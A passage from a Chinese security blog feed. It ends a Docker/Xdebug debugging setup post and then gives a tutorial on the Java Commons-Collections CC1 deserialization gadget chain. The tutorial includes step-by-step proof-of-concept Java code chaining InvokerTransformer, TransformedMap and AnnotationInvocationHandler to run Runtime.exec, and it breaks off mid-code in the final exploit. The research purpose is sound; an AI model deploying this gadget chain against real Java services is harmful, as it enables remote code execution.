class="line"><span class="comment">#原作者在这加了一个sleep infinity并叮嘱一定加上...... 我们这里千万不要加, 不然进程会一直卡在这导致你访问不了web页面</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br></pre></td></tr></table></figure><p>千万要注意这里题目中使用的是nginx, 不是apache2</p><p>之后继续对dockerfile做出调整, 最终为</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-ext-enable xdebug \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install ssh -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>修改好start.sh和dockerfile之后, 我们手动创建一个镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mycodbox .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327234247184.png" alt="image-20240327234247184"></p><p>之后新建一个容器把81和22端口映射出来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328000916452.png" alt="image-20240328000916452"></p><p>看到这里就算成功了</p><p>访问一下也没什么问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001145301.png" alt="image-20240328001145301"></p><p>之后配置phpstorm, 这里原文中就没什么坑了</p><p>直接跳转到原文链接的方法二, </p><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><p>后面至作简单的示例</p><p>选择这个</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001340954.png" alt="image-20240328001340954"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001418960.png" alt="image-20240328001418960"></p><p>一路next</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001550926.png" alt="image-20240328001550926"></p><p>一路next直到看见项目</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001907238.png" alt="image-20240328001907238"></p><p>之后要做</p><ol><li>配置 CLI Interpreter</li><li>配置目录映射</li><li>设置Xdebug端口</li><li>配置一个 Run&#x2F;Debug Configuration</li><li>启动 PHP Debug Listening</li></ol><p><strong>配置 CLI Interpreter</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP。设置 CLI Interpreter</p><p>新建一个 CLI Interpreter。选择 From Docker, Vagrant, VM, WSL,Remote….</p><p>这里我们可以填 SSH，也可以直接选择 Docker。我这里用的是 SSH</p><p>设置 PHP executable 路径。不知道可以进入 container 中使用<code>whereis php</code>进行搜索</p><p>参考原文, 这里不做演示了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002119294.png" alt="image-20240328002119294"></p><p><strong>配置 目录映射</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers。配置目录映射</p><p>注意一定要把 Use path mappings 的勾勾上，才能配置目录映射</p><p>Absolute path on the server 是要手动打上服务器路径的</p><p><strong>配置一个 Run&#x2F;Debug Configuration</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002530718.png" alt="image-20240328002530718"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002948142.png" alt="image-20240328002948142"></p><p>打个断点试试, 成功!!</p><p><strong><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002929316.png" alt="image-20240328002929316"></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP-storm-Xdebug-远程调试docker项目-ssh隧道&quot;&gt;&lt;a href=&quot;#PHP-storm-Xdebug-远程调试docker项目-ssh隧道&quot; class=&quot;headerlink&quot; title=&quot;PHP storm + Xdebug 远程调</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java反序列化之CC链</title>
    <link href="http://example.com/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/"/>
    <id>http://example.com/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/</id>
    <published>2024-03-15T13:17:27.000Z</published>
    <updated>2024-07-23T05:57:04.052Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/335892.html">https://www.freebuf.com/articles/web/335892.html</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>jdk-8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>jdk源码</p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>maven3.6.3</p><p><a href="https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/">https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/</a></p><p>关于maven的配置教程</p><p><a href="https://blog.csdn.net/succing/article/details/127281200">https://blog.csdn.net/succing/article/details/127281200</a></p><p>坑比较多, 不过上面这几篇文章都能完美解决</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315213238197.png" alt="image-20240315213238197"></p><p>到这里环境就搭建好了</p><p>现在开始分析链子</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>还记得Java反序列化的基础吗, 我们需要一个readObject方法来作为反序列化的入口</p><p>而我们的最终目的当然是命令执行</p><p>一个正常的思路应该是从链子的尾部开始的, 先找到危险函数, 再想办法如何调用到它</p><p>所以首先是寻找一个可以命令执行的地方</p><p>这里需要的是Transformer这个接口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317132926538.png" alt="image-20240317132926538"></p><p>ctrl + alt + B查看实现了该接口的类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133044679.png" alt="image-20240317133044679"></p><p>这里要用到的就是InvokerTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133325160.png" alt="image-20240317133325160"></p><p>InvokerTransformer的transform方法存在反射调用任意类</p><p>浅试一下利用InvokerTransformer类来弹个计算器</p><p>根据这个构造函数来传入参数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141434267.png" alt="image-20240317141434267"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141358312.png" alt="image-20240317141358312"></p><p>这里就成功弹了计算器</p><p>现在我们找到了一个最终的出口, 接下来就是要返回去找哪里调用了这个危险的transform方法</p><p>右键find useges, 找到这个TransformedMap</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317142752780.png" alt="image-20240317142752780"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143423354.png" alt="image-20240317143423354"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143534346.png" alt="image-20240317143534346"></p><p>第203行的checkSetValue调用了valueTransformer下的transform, 而这个valueTransformer是由构造函数的参数决定的</p><p>并且, 构造器TransformedMap是一个protected保护类型, 我们不能从外部直接调用, 需要从其他调用了TransformedMap的地方入手 </p><p>在<code>decorate()</code>静态方法中, 直接new了一个TransformedMap对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317144110965.png" alt="image-20240317144110965"></p><p>控制valueTransformer的地方有了, 那么谁来调用checkSetValue呢?</p><p>依旧是find useages</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317145629199.png" alt="image-20240317145629199"></p><p>在AbstractInputCheckedMapDecorator这个抽象类中的**setValue()**调用了checkSetValue方法</p><p>并且AbstractInputCheckedMapDecorator是TransformedMap的父类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317175103045.png" alt="image-20240317175103045"></p><p>这里就不得不补一下java集合的知识, </p><p>在遍历一个集合时, 可以使用增强for循环进行一下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">    <span class="comment">//Map.entry&lt;Integer,String&gt; 映射项（键-值对）  有几个方法：用上面的名字entry</span></span><br><span class="line">    <span class="comment">//entry.getKey() ;entry.getValue(); entry.setValue();</span></span><br><span class="line">    <span class="comment">//map.entrySet()  返回此映射中包含的映射关系的 Set视图。</span></span><br><span class="line">    System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Map.Entry&lt;Integer, String&gt; entry表示键值对, map.entrySet()表示键值对的集合</p><p>这里setValue()就是entry下的一个方法</p><p>因此我们可以利用TransformedMap里的decorate创建一个TransformedMap实例, 由于其继承了AbstractInputCheckedMapDecorator类, 当调用setValue时, 就对调用AbstractInputCheckedMapDecorator下的setValue, 从而调用parent.checkSetValue(value);</p><p>那么, 这个parent又是怎么一回事呢?</p><p>好像很少有文章把这个讲的很明白(或许是我太菜了)</p><p>我们预期的parent应该是一个InvokerTransformer的对象</p><p>不妨调试一下看看怎么个事</p><p>注意看这个transformedmap.entrySet()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318220856808.png" alt="image-20240318220856808"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221154799.png" alt="image-20240318221154799"></p><p>这里跳到了TransformedMap的父类AbstractInputCheckedMapDecorator下的entrySet(), 注意此时仍然在TransformedMap中, 这个entrySet()是继承来的</p><p>跟进isSetValueChecking()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221426861.png" alt="image-20240318221426861"></p><p>这里回到了TransformedMap自己的isSetValueChecking()方法, 由于valueTransformer赋值了, 所以返回true</p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221554102.png" alt="image-20240318221554102"></p><p>注意这个EntrySet(), 第二个参数是this, 也就是本身, 跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221800461.png" alt="image-20240318221800461"></p><p>这里恍然大悟, this.parent就是这个对象本身, 此时这个对象就是TransformedMap实例, 它下面的checkSetValue正是我们要调用到的方法</p><p>至此这个谜团就被解开了</p><p>那么我们从decorate开始, 编写一段poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;n4c1&quot;</span>, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : transformedmap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317184029496.png" alt="image-20240317184029496"></p><p>成功调用</p><p>至此, 链子就延伸到了setValue</p><p>依旧是find usages, 看看哪里调用了setValue</p><p>这里应该是要搜索找一个AnnotationInvocationHandler类, 但是我并没有找到</p><p>所以直接去到目录下找了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317205707923.png" alt="image-20240317205707923"></p><p>这里是点进去是.class文件, 看见的就是反编译后的代码, 那么就可以肯定是配置源码那一步出错了</p><p>找了半天发现之前sun包的替换搞错了, 正确的路径: jdk-af660750b2f4\src\share\classes\sun</p><p>应该使用这里的sun包加到djk的src中去</p><p>之后就可以找到AnnotationInvocationHandler这个类, 它重写了应该readObject方法且在readObject中进行了对集合的遍历 并且调用了setValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223012579.png" alt="image-20240318223012579"></p><p>我们的第一想法应该是去控制这个memberValues()</p><p>可以看见在构造函数中对其进行了赋值, 但是这个构造函数并没有public修饰</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223208459.png" alt="image-20240318223208459"></p><p>因此需要用反射获取这个类</p><p>这里构造函数的第一个参数Class&lt;? extends Annotation&gt;表示一个注解类</p><p><strong>什么是注解类?</strong></p><p><a href="https://www.runoob.com/w3cnote/java-annotation.html">https://www.runoob.com/w3cnote/java-annotation.html</a></p><p>按我个人理解, 这与python的装饰器有一丝的相似之处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedmap);<span class="comment">//传入一个Target类, 他就是一个注解类</span></span><br></pre></td></tr></table></figure><p>由此就可以调用到memberValue.setValue即transformedmap.setValue</p><p>但是眼前又出现了一个问题, 就是如何满足这里的if条件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240320220648856.png" alt="image-20240320220648856"></p><p>这里先放一放</p><p>实际上, 一共有三个问题待解决</p><ol><li>由于只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列, 而Runtime并没有实现, Runtime无法被序列化便是第一个问题</li><li>上图中memberValue.setValue的参数并不是我们预期的内容</li><li>如何两个if</li></ol><p>首先是如何序列化Runtime</p><p><code>Runtime</code>是不能序列化的，但是<code>Runtime.class</code>是可以序列化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>s Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        run.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>InvokerTransformer</code>反射调用Runtime</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//InvokerTransformer反射获取Runtime的getRuntime方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">//InvokerTransformer反射 执行获取到的getRuntime方法, 返回一个runtime对象</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(runmethod);</span><br><span class="line">        <span class="comment">//反射获取Runtime下的exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">execmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;&#125;).transform(Runtime.class);</span><br><span class="line">        </span><br><span class="line">        execmethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321194633809.png" alt="image-20240321194633809"></p><p>这里虽然成功了, 但是紧接着就出现了另一个问题, 在一开始我们只向TransformedMap.decorate中传入了一个我们精心构造的invokerTransformer对象, 而现在变成了这样一串代码, 也就是从一次transform的调用变成了多次transform的调用</p><p>这里移步至ChainedTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321200533277.png" alt="image-20240321200533277"></p><p>这里的transform进行了对iTransformers[i]的递归调用, 正好就是我们反射代码中的过程, 我们只需要将iTransformers[i]赋值为invokerTransformer即可,这样就通过同名函数调用到我们需要的那个transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>与之前的代码拼接, 构造一个transformedmap, 利用AnnotationInvocationHandler中readObject中的setValue去调用transformedmap中的checkSetValue</p><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title 